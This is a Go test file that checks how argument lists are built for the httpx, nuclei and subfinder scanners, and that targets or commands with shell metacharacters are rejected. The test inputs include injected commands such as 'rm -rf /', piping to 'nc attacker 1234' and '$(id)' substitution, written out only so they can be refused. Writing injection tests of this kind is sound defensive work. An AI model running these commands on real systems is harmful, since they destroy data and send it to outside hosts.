// Copyright 2026 Hanzo AI Inc. All Rights Reserved.

package scan

import (
	"strings"
	"testing"
)

// httpxLike is the descriptor one of the providers carries, used here so the
// rules are exercised through the same shape production uses.
var httpxLike = scanner{
	name: "httpx", bin: "/usr/bin/httpx",
	defaultArgs: "-u %s -json",
	jsonFlags:   []string{"-json", "-jsonl"}, addJSON: "-json",
	targetFlags: []string{"-u", "-target", "-l"}, addTarget: "-u",
}

// A scan target reaches this from a request and is handed to a process, so what
// it may contain is the whole of the question.
//
// This was the one part identical in all three providers and the one part none
// of them asserted: sixty lines duplicated three ways, and no test that a
// semicolon in a target is refused. A relaxed copy would have looked exactly
// like the other two.
func TestAShellMetacharacterNeverReachesTheProcess(t *testing.T) {
	for _, bad := range []string{
		"example.com; rm -rf /",
		"example.com && whoami",
		"example.com | nc attacker 1234",
		"example.com `id`",
		"example.com $HOME",
		"$(id).example.com",
	} {
		t.Run(bad, func(t *testing.T) {
			if _, err := httpxLike.argv(bad, ""); err == nil {
				t.Errorf("target %q was accepted", bad)
			}
		})
	}

	if _, err := httpxLike.argv("", ""); err == nil {
		t.Error("an empty target was accepted")
	}
}

// The command is written by an operator rather than carried on a request, so it
// is allowed a dollar and refused the metacharacters that chain a second
// process. That asymmetry is deliberate and easy to erase by tidying, so it is
// stated here.
func TestACommandMayHoldADollarAndNeverASemicolon(t *testing.T) {
	for _, bad := range []string{"-u %s; id", "-u %s && id", "-u %s | id", "-u %s `id`"} {
		if _, err := httpxLike.argv("example.com", bad); err == nil {
			t.Errorf("command %q was accepted", bad)
		}
	}
	if _, err := httpxLike.argv("example.com", "-u %s -json -H $TOKEN"); err != nil {
		t.Errorf("a command referencing a variable was refused: %v", err)
	}
}

// Where the target lands, and that structured output is always asked for.
func TestTheTargetGoesWhereTheCommandSaysAndTheOutputIsAlwaysStructured(t *testing.T) {
	for _, tc := range []struct {
		what, command string
		want          []string
	}{
		{"the default names it through %s", "", []string{"-u", "example.com", "-json"}},
		{"an explicit %s is where it goes", "-u %s -json", []string{"-u", "example.com", "-json"}},
		{"no %s and no target flag appends it", "-json", []string{"-json", "-u", "example.com"}},
		{"a command that already names the target keeps its own", "-l hosts.txt -json", []string{"-l", "hosts.txt", "-json"}},
		{"structured output is added when unasked", "-u %s", []string{"-u", "example.com", "-json"}},
		{"and not added twice when asked", "-u %s -jsonl", []string{"-u", "example.com", "-jsonl"}},
	} {
		t.Run(tc.what, func(t *testing.T) {
			got, err := httpxLike.argv("example.com", tc.command)
			if err != nil {
				t.Fatalf("argv: %v", err)
			}
			if strings.Join(got, " ") != strings.Join(tc.want, " ") {
				t.Errorf("argv = %v, want %v", got, tc.want)
			}
		})
	}
}

// Each provider keeps its own flags, and the rules are the same for all of them.
func TestEveryScannerRefusesTheSameThings(t *testing.T) {
	for _, s := range []scanner{
		httpxLike,
		{name: "nuclei", defaultArgs: "-u %s -jsonl", jsonFlags: []string{"-jsonl", "-json"}, addJSON: "-jsonl",
			targetFlags: []string{"-u", "-target", "-l"}, addTarget: "-u"},
		{name: "subfinder", defaultArgs: "-d %s -json", jsonFlags: []string{"-json", "-oJ"}, addJSON: "-json",
			targetFlags: []string{"-d", "-domain", "-dL"}, addTarget: "-d"},
	} {
		t.Run(s.name, func(t *testing.T) {
			if _, err := s.argv("example.com; id", ""); err == nil {
				t.Error("a target carrying a semicolon was accepted")
			}
			args, err := s.argv("example.com", "")
			if err != nil {
				t.Fatalf("argv: %v", err)
			}
			if !contains(args, "example.com") {
				t.Errorf("argv = %v, want the target in it", args)
			}
		})
	}
}
